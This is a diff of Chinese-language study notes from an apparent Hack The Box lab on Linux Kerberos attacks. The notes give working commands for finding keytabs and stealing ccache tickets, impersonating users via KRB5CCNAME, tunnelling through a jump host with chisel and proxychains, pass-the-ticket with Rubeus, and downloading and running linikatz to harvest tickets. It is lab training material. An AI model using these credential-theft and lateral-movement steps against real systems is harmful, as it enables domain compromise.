@@ -479,7 +479,7 @@ realm list      查看机器有没有加入域 和 相关信息
 ps -ef | grep -i "winbind\|sssd"            检查 Winbind 或 SSSD 进程是否正在运行
 
 
-find / -name *keytab* -ls 2>/dev/null      找 keytab，包含一个或多个用户的密钥
+find / -name '*keytab*' -ls 2>/dev/null      找 keytab，包含一个或多个用户的密钥
 
 crontab -l      查计划任务，发现 /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
 cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh    打开脚本，发现使用了kinit，用于向 Kerberos 认证，并获取一张 TGT，缓存到本地（ccache 文件）
@@ -504,25 +504,44 @@ https://crackstation.net/      在线哈希破解
 
 
 ls -la /tmp                                          看 ccache 文件，发现用户 julio@inlanefreight.htb
-id julio@inlanefreight.htb                           看用户信息
+id julio@inlanefreight.htb                           看 用户信息
 cp /tmp/krb5cc_647401106_I8I133 .                    把 /tmp 下的票据缓存文件 krb5cc_647401106_I8I133 复制到当前目录
 export KRB5CCNAME=/root/krb5cc_647401106_I8I133      设置环境变量 KRB5CCNAME，告诉 Kerberos 客户端库该文件作找票据，而不是默认的 /tmp/krb5cc_<uid>
 klist                                                列出，确认票据
 smbclient //dc01/C$ -k -c ls -no-pass                登录
 
 
+echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf                                  设置 socks5 代理
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz      下载 chisel
+gzip -d chisel_1.7.7_linux_amd64.gz                                                               解压
+mv chisel_* chisel && chmod +x ./chisel                                                           移动 chisel_* 到 chisel 文件夹 
+sudo ./chisel server --reverse                                                                    建立隧道服务端
+xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution          连接到跳板机
+C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks                                       在跳板机启动客户端
+从目标 ccache 拿到票据缓存
+export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133                                       冒充
+proxychains impacket-wmiexec dc01 -k                                                              登录              https://github.com/haad/proxychains
+或 用 evil-winrm 登录
+sudo apt-get install krb5-user -y                                                                 安装 krb5 身份验证工具
+在安装过程中设置 域名 和 主机名
+proxychains evil-winrm -i dc01 -r inlanefreight.htb                                               登录
 
-Proxies:
-  https://github.com/jpillora/chisel
-  https://github.com/haad/proxychains
 
-Find keytab in Linux:
-  find / -name *keytab* -ls 2>/dev/null
-  ls -la /tmp | grep krb5
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi                                      把 krb5cc_647401106_I8I133 改名为 julio.kirbi
+C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi                                      传递
 
-  pass ticket: 
-  export KRB5CCNAME=/root/krb5cc_647401106_9JBodG      (set env variable)
-  kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab      (use kinit)
+
+Linikatz      Linux 版 Mimikatz
+  https://github.com/CiscoCXSecurity/linikatz
+
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh      下载
+/opt/linikatz.sh                                                                        启动，自动找票据
+
+
+
+
+
+
 
 
 Crack keytab:
